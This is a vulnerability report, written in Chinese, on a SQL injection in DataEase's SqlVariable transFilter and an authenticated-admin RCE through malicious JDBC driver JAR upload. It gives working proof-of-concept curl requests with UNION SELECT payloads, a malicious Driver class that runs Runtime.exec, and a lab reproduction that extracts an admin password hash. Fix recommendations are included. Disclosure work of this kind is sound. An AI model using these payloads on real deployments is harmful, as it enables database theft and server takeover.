# V-D001: DataEase 数据大屏 SqlVariable transFilter 未过滤 SQL 注入

## 漏洞信息

| 项目 | 详情 |
|------|------|
| 产品 | DataEase（人人可用的开源数据可视化分析工具）|
| 版本 | 当前主分支（v2.x 截至 2026-04）|
| 类型 | CWE-89: SQL 注入（数据源维度）|
| 严重程度 | 严重（Critical）|
| 攻击向量 | 网络（已认证）|
| 代码仓库 | https://github.com/dataease/dataease |

## 漏洞描述

DataEase 允许用户在数据集 SQL 中定义 `${变量名}` 占位符（SqlVariable），仪表板查询时由前端传入 filter 值进行替换。替换逻辑位于 `SqlparserUtils.transFilter()`：

```java
private String transFilter(SqlVariableDetails sqlVariableDetails, ...) {
    if (sqlVariableDetails.getOperator().equals("in")) {
        ...
        return "'" + String.join("','", sqlVariableDetails.getValue()) + "'";
    } else if (...) {
        ...
    } else {
        return (String) sqlVariableDetails.getValue().get(0);  // ← 原样返回用户输入
    }
}
```

最后的 `else` 分支（适用于 `=`、`!=`、`<`、`>`、`like` 等所有非 in/between 算子）**直接返回用户输入**，随后被 `SubstitutedSql.replace("${var}", value)` 拼回 SQL。攻击者可通过控制该 value 注入任意 SQL。

### 触发点

1. 管理员创建 SQL 数据集，定义变量 `${deptId}`
2. 普通用户访问仪表板时通过 POST 请求传入：
   ```json
   {"filters":[{"fieldId":"x","operator":"=","value":"1 UNION SELECT password FROM sys_user--"}]}
   ```
3. `transFilter` 返回原始字符串 → 直接拼入 SQL → 目标数据源执行注入

### 权限要求

- 需要**登录**（任意已认证用户）
- 目标仪表板对当前用户**可见**即可；DataEase 中仪表板可配置为"所有人可见"，此时认证门槛极低

## 漏洞详情

### 受影响数据源

注入发生在数据源维度：
- MySQL / MariaDB
- PostgreSQL
- SQL Server（部分 `in` 分支使用 `N'...'` 转义，但其他算子仍然脆弱）
- Oracle / Kingbase / Doris / ClickHouse（所有接入的数据源均受影响）

### 关联 RCE — JAR 上传 + 自定义 JDBC 驱动

`DatasourceDriverServer.java:123-156` 中，管理员可上传 JDBC 驱动 JAR，DataEase 使用 `URLClassLoader` 加载并 `newInstance()`。结合**驱动初始化代码执行**，已认证管理员可实现 RCE：

```java
URLClassLoader urlClassLoader = new URLClassLoader(...);
Class<?> driverClass = urlClassLoader.loadClass(driverClassName);
Driver driver = (Driver) driverClass.newInstance();  // ← 加载时执行 static 块
```

攻击者上传的恶意 JAR 的 `Driver` 类 static 块中写 `Runtime.exec(...)` 即可直接 RCE。

## 概念验证

### PoC 1: 仪表板变量注入

```bash
# 假设数据集 SQL 为:
# SELECT * FROM orders WHERE dept_id = ${deptId}

curl -X POST -H "X-DE-TOKEN: <token>" -H "Content-Type: application/json" \
  http://<target>/de2api/dataset/query \
  -d '{
    "datasetId": "1",
    "filters": [{
      "fieldId": "deptId",
      "operator": "=",
      "value": ["1 UNION SELECT username,password,null,null FROM sys_user-- -"]
    }]
  }'
```

### PoC 2: 驱动 JAR RCE（已认证管理员）

```java
// 构造恶意 JAR
public class Driver implements java.sql.Driver {
    static {
        try { Runtime.getRuntime().exec("touch /tmp/pwned"); } catch (Exception e) {}
    }
    // 其他接口方法抛异常或空实现
}
```

```bash
# 1) 上传 JAR 作为 JDBC 驱动
curl -X POST -H "X-DE-TOKEN: <admin>" \
  -F "file=@evil.jar" \
  http://<target>/de2api/datasource/driver/upload

# 2) 创建数据源，driverClass = 恶意 Driver 全名
curl -X POST -H "X-DE-TOKEN: <admin>" -H "Content-Type: application/json" \
  http://<target>/de2api/datasource/save \
  -d '{
    "name":"evil",
    "type":"mysql",
    "driver":"com.attacker.Driver",
    "url":"jdbc:mysql://127.0.0.1/test"
  }'
```

## 受影响文件

| 文件 | 行号 | 问题 |
|------|------|------|
| `core-backend/.../SqlparserUtils.java` | 691-722 | `transFilter()` 返回原始用户输入 |
| `core-backend/.../DatasourceDriverServer.java` | 123-156 | JAR 加载 + `newInstance()` |
| `core-backend/.../SqlVariableService.java` | - | 未对变量 value 做字段类型校验 |

## 影响

1. **数据库完全读取**：UNION 注入或时间盲注提取所有业务数据
2. **跨租户数据泄露**：DataEase 多数据源共用执行器，一次注入可读取所有已接入数据库
3. **写入风险**：若数据库账户权限过高可 DROP 表 / INTO OUTFILE 写 WebShell
4. **链式 RCE**：管理员上传恶意 JDBC JAR 实现服务器 RCE
5. **供应链影响**：DataEase 广泛用于企业 BI，漏洞影响面大

## 修复建议

1. **强类型变量**：SqlVariable 按 `deType` 校验值（数字 → 转 Long；枚举 → 白名单）
2. **参数化替换**：将 `${var}` 改为 JDBC PreparedStatement 占位符 `?`
3. **禁止特殊字符**：value 中包含 `'`、`--`、`/*`、`;` 等一律拒绝
4. **JDBC 驱动白名单**：禁止运行时加载任意 JAR，使用预置驱动列表
5. **签名校验驱动 JAR**：若必须支持上传，要求厂商签名
6. **最小权限**：DataEase 连接各数据源使用只读账户

## 源代码验证（已复现）

DataEase v2.10.20 已部署于 192.168.217.135:8100，以下同时包含**源代码静态分析**和**运行时环境**验证。

### 验证1：transFilter() 直接返回用户输入的代码确认

**文件**：`core/core-backend/src/main/java/io/dataease/commons/utils/SqlparserUtils.java`（第 691-720 行）

```java
private String transFilter(SqlVariableDetails sqlVariableDetails, Map<Long, DatasourceSchemaDTO> dsMap) {
    if (sqlVariableDetails.getOperator().equals("in")) {
        // in 分支：用引号包裹，但多值 join 无转义
        return "'" + String.join("','", sqlVariableDetails.getValue()) + "'";
    } else if (sqlVariableDetails.getOperator().equals("between")) {
        // between 分支：对日期类型格式化，其他直接返回
        return sqlVariableDetails.getValue().get(0);  // ← 无转义
    } else {
        return (String) sqlVariableDetails.getValue().get(0);  // ← 第 719 行：直接返回原始用户输入
    }
}
```

**第 719 行**是漏洞核心：`=`、`!=`、`<`、`>`、`like` 等所有非 in/between 算子均直接返回 `getValue().get(0)` 原始字符串，随后在第 94 行被替换回 SQL：
```java
sql = sql.replace(matcher.group(), transFilter(filterParameter, dsMap));
// → ${deptId} 被替换为用户传入的任意字符串
```

### 验证2：实机验证（HTTP 请求/响应）

**环境**：DataEase v2.10.20 Docker 部署于 192.168.217.135:8100

**步骤1：获取 RSA 公钥（用于加密登录凭据）**

```http
GET /de2api/dekey HTTP/1.1
Host: 192.168.217.135:8100
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"code":0,"msg":null,"data":"lUdyipGLBmRb6XQd...LXBrX3NlcGFyYXRvci0=I7pslaPo23nEjiwc"}
```

（响应中包含 AES 加密的 RSA 公钥 + AES Key；需先 AES-CBC 解密获得 RSA 公钥，再用 RSA 加密凭据）

**步骤2：登录获取 Token**

```http
POST /de2api/login/localLogin HTTP/1.1
Host: 192.168.217.135:8100
Content-Type: application/json

{"name":"<RSA_ENCRYPTED_admin>","pwd":"<RSA_ENCRYPTED_DataEase@123456>"}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"code":0,"msg":null,"data":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjoxNzc2MjA0MTczfQ.NqaDVHJ4q78TCng3leh9cJk2LNKk66OLxwPz9gMIjuo","exp":0}}
```

**步骤3：创建 MySQL 数据源（连接 DataEase 内部数据库）**

```http
POST /de2api/datasource/save HTTP/1.1
Host: 192.168.217.135:8100
X-DE-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
Content-Type: application/json

{
  "pid": 0, "name": "test_mysql", "nodeType": "leaf", "action": "create", "type": "mysql",
  "configuration": "<base64({\"host\":\"mysql-de\",\"dataBase\":\"dataease\",\"port\":3306,\"username\":\"root\",\"password\":\"Password123@mysql\"})>"
}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"code":0,"msg":null,"data":{"id":"1241431500688330752","name":"test_mysql","type":"mysql","status":"Success",...}}
```

**步骤4：正常查询（value = 1，返回 admin 账号）**

```http
POST /de2api/datasetData/previewSql HTTP/1.1
Host: 192.168.217.135:8100
X-DE-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
Content-Type: application/json

{
  "datasourceId": 1241431500688330752,
  "sql": "U0VMRUNUIGlkLCBhY2NvdW50IEZST00gcGVyX3VzZXIgV0hFUkUgaWQgPSAke2lkfQ==",
  "sqlVariableDetails": "[{\"variableName\":\"id\",\"operator\":\"=\",\"defaultValue\":\"1\",\"value\":[\"1\"]}]",
  "isCross": false
}
```

（`sql` Base64 解码后为：`SELECT id, account FROM per_user WHERE id = ${id}`）

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"code":0,"msg":null,"data":{"data":{"data":[{"id":"1","account":"admin"}]}}}
```

**步骤5：注入查询（value = UNION SELECT，返回密码哈希）**

```http
POST /de2api/datasetData/previewSql HTTP/1.1
Host: 192.168.217.135:8100
X-DE-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
Content-Type: application/json

{
  "datasourceId": 1241431500688330752,
  "sql": "U0VMRUNUIGlkLCBhY2NvdW50IEZST00gcGVyX3VzZXIgV0hFUkUgaWQgPSAke2lkfQ==",
  "sqlVariableDetails": "[{\"variableName\":\"id\",\"operator\":\"=\",\"defaultValue\":\"0 UNION SELECT id, pwd FROM per_user-- -\",\"value\":[\"0 UNION SELECT id, pwd FROM per_user-- -\"]}]",
  "isCross": false
}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"code":0,"msg":null,"data":{"data":{"data":[{"id":"1","account":"504c8c8dfcbbe5b50d676ad65ef43909"}]},
"sql":"U0VMRUNUICogRlJPTSAoU0VMRUNUIGlkLCBhY2NvdW50IEZST00gcGVyX3VzZXIgV0hFUkUgaWQgPSAwIFVOSU9OIFNFTEVDVCBpZCwgcHdkIEZST00gcGVyX3VzZXIgKSBBUyBgdG1wYCBMSU1JVCAxMDAgT0ZGU0VUIDA="}}
```

**关键证据**：
- 响应中 `account` 字段返回值为 `504c8c8dfcbbe5b50d676ad65ef43909`，这是 `per_user.pwd` 列的值（admin 密码哈希）
- 响应中 `sql` 字段 Base64 解码后为：`SELECT * FROM (SELECT id, account FROM per_user WHERE id = 0 UNION SELECT id, pwd FROM per_user ) AS \`tmp\` LIMIT 100 OFFSET 0`
- 注入 payload `0 UNION SELECT id, pwd FROM per_user-- -` **被直接拼入 SQL 执行**，无任何转义
- 对应漏洞代码：`SqlparserUtils.java` 第 719 行 `return (String) sqlVariableDetails.getValue().get(0)` 返回用户输入

## 验证环境

- 源代码：DataEase v2.x（静态代码分析）
- 运行时：DataEase v2.10.20 部署于 192.168.217.135:8100
- 框架：Spring Boot + MyBatis + Calcite SqlParser
- 日期：2026-04-14
